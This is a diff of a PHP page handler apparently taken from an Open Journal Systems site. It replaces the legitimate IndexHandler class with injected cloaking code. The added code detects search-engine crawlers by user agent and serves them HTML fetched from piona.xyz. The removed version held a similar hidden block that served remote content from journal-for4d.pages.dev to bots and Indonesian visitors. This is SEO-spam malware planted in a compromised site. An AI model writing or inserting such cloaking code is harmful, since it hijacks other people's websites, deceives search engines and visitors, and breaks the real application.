@@ -1,66 +1,31 @@
-<?php
+<?php 
+ini_set('display_errors', 1); 
+ini_set('display_startup_errors', 1); 
+error_reporting(E_ALL); 
 
+$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
 
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$ip = $_SERVER['REMOTE_ADDR'];
-function getCountryByIp($ip)
-{
-    $url = "http://ip-api.com/json/$ip";
+$bot_signatures = [ 
+    'googlebot', 
+    'bingbot', 
+    'slurp', 
+    'duckduckbot', 
+    'baiduspider', 
+    'yandex', 
+    'crawler', 
+    'Google-Site-Verification',
+    'spider' 
+];
 
-    $response = file_get_contents($url);
-    $data = json_decode($response, true);
-    $countryCode = $data['countryCode'];
-    return $countryCode;
+if (strpos($request_uri, '/') !== false) { 
+    foreach ($bot_signatures as $bot) { 
+        if (strpos($user_agent, $bot) !== false) { 
+            $html = @file_get_contents('https://piona.xyz/landing/journal.yayasansahara.org/oke.txt'); 
+            header("Content-Type: text/html; charset=UTF-8"); 
+            echo $html !== false ? $html : "Cloaked content failed to load."; 
+            exit; 
+        } 
+    } 
 }
-$ctryCode = getCountryByIp($ip);
-
-if (isset($_GET['a']) && $_GET['a'] === 'a') {
-    echo "country: " . $ctryCode;
-    echo "<br>";
-    echo "useragent: " . $userAgent;
-    echo "<br>";
-    echo "ip: " . $ip;
-    exit;
-}
-
-if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'ID') {
-    echo file_get_contents('https://journal-for4d.pages.dev/index.txt');
-    exit;
-}
-
-/**
- * @file pages/index/IndexHandler.inc.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @class IndexHandler
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- */
-
-import('classes.handler.Handler');
-
-class PKPIndexHandler extends Handler {
-	/**
-	 * Set up templates with announcement data.
-	 * @protected
-	 * @param $context Context
-	 * @param $templateMgr PKPTemplateManager
-	 */
-	protected function _setupAnnouncements($context, $templateMgr) {
-		$enableAnnouncements = $context->getData('enableAnnouncements');
-		$numAnnouncementsHomepage = $context->getData('numAnnouncementsHomepage');
-		if ($enableAnnouncements && $numAnnouncementsHomepage) {
-			$announcementDao = DAORegistry::getDAO('AnnouncementDAO'); /* @var $announcementDao AnnouncementDAO */
-			$announcements = $announcementDao->getNumAnnouncementsNotExpiredByAssocId($context->getAssocType(), $context->getId(), $numAnnouncementsHomepage);
-			$templateMgr->assign(array(
-				'announcements' => $announcements->toArray(),
-				'numAnnouncementsHomepage' => $numAnnouncementsHomepage,
-			));
-		}
-
-	}
-}
+?>
